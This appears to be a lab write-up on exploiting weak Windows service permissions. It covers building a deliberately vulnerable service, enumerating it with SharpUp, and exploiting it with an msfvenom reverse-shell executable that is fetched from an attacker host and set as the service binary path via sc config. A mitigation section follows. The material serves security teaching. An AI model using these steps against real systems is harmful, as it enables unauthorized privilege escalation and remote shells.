# Weak Service Permissions

## Table of Contents

- [Weak Service Permissions](#weak-service-permissions)
  - [Table of Contents](#table-of-contents)
  - [Description](#description)
  - [Lab Setup](#lab-setup)
    - [Manual Lab Setup](#manual-lab-setup)
    - [PowerShell Script Lab Setup](#powershell-script-lab-setup)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Mitigation](#mitigation)
  - [References](#references)

## Description

Weak Service Permissions" on Windows indicate insufficient or incorrect permissions within services. Exploiting this vulnerability enables attackers to gain unauthorized access or elevated privileges by manipulating a service's configuration.

## Lab Setup

### Manual Lab Setup

1) Open a PowerShell with local Administrtor Privileges and use the following command to create a new folder:

```
mkdir "C:\Program Files\CustomSrv3\"
```

2) Download the file [Service3.exe](/Lab-Setup-Binary/Service3.exe) to the 'C:\Program Files\CustomSrv3' directory.

3) Install the new Service:

```
New-Service -Name "Vulnerable Service 3" -BinaryPathName "C:\Program Files\CustomSrv3\Service3.exe" -DisplayName "Vuln Service 3" -Description "My Custom Vulnerable Service 3" -StartupType Automatic
```

4) Edit new service's permissions to be controlled by BUILTIN\Users:

```
cmd.exe /c 'sc sdset "Vulnerable Service 3" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;AU)(A;;CCLCSWRPWPDTLOCRRC;;;PU)(A;;DCRPWP;;;BU)'
```

Outcome:

![Weak-Service-Permissions-Manual-Lab-Setup](/Pictures/Weak-Service-Permissions-Manual-Lab-Setup.png)

5) Verify the new service (services.msc):

![Weak-Service-Permissions-Verify-Service](/Pictures/Weak-Service-Permissions-Verify-Service.png)

6) Manually start the service from the service panel, or reboot the machine due to the service is set to start automatically upon machine boot.

:information_source: If you want to unistall the new service use the following command:

```
Remove-Service -Name "Vulnerable Service 3"
```

### PowerShell Script Lab Setup

To set up the lab with the 'Weak Service Binary Permissions' vulnerability is by using the custom PowerShell script named [WeakServicePermissions.ps1](/Lab-Setup-Scripts/WeakServicePermissions.ps1).

1) Open a PowerShelll with local Administrator privileges and run the script:

```
.\WeakServicePermissions.ps1
```

Outcome:

![Weak-Service-Permissions-Script-Lab-Setup](/Pictures/Weak-Service-Permissions-Script-Lab-Setup.png)

2) Manually start the service from the service panel, or reboot the machine due to the service is set to start automatically upon machine boot.

:information_source: If you want to unistall the new service use the following command:

```
Remove-Service -Name "Vulnerable Service 3"
```

## Enumeration

To run the SharpUp tool and perform an enumeration of the `Weak Service Permissions` vulnerability, you can execute the following command with appropriate arguments:

```
SharpUp.exe audit ModifiableServices
```

Outcome:

![Weak-Service-Permissions-Tool-Enumeration](/Pictures/Weak-Service-Permissions-Tool-Enumeration.png)

## Exploitation

1) Create with msfvenom a malicious exe file:

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=eth0 LPORT=1234 -f exe > nikos.exe
```

2)  Open a listener in your kali machine. 

3) Create Temp folder:

```
mkdir C:\TempFolder
```

4) Transfer malicious executablr file in Temp folder:

```
iwr -Uri http://<ip>:<port>/nikos.exe -Outfile C:\TempFolder\nikos.exe
```

5) Reconfigure the binary path on the vulnerable service:

```
sc config "Vulnerable Service 3" binPath= C:\TempFolder\nikos.exe
```

6) Verify that the path has indeed been updated:

```
sc qc "Vulnerable Service 3"
```

Outcome:

![Weak-Service-Permissions-Exploitation-1](/Pictures/Weak-Service-Permissions-Exploitation-1.png)

7) Stop the running service:

```
sc stop "Vulnerable Service 3"
```

8) Start the vulnerable service:

```
sc start "Vulnerable Service 3"
```

Outcome:

![Weak-Service-Permissions-Exploitation-2](/Pictures/Weak-Service-Permissions-Exploitation-2.png)

9) Verify the reverse shell on your Kali machine:

![Weak-Service-Permissions-Reverse-Shell](/Pictures/Weak-Service-Permissions-Reverse-Shell.png)

## Mitigation

To defend against Weak Service Permissions vulnerabilities, adjust permissions on Service initiated through this mechanism. This limits unauthorized access and strengthens security measures:

```
sc sdset "Vulnerable Service 3" D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
```

## References

- [Introduction to Windows Services applications Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/introduction-to-windows-service-applications)
- [Hot to Create Windows Services Microsoft](https://learn.microsoft.com/en-us/dotnet/framework/windows-services/how-to-create-windows-services)
- [How to View and Modify Service Permissions in Windows by winhelponline](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/?expand_article=1)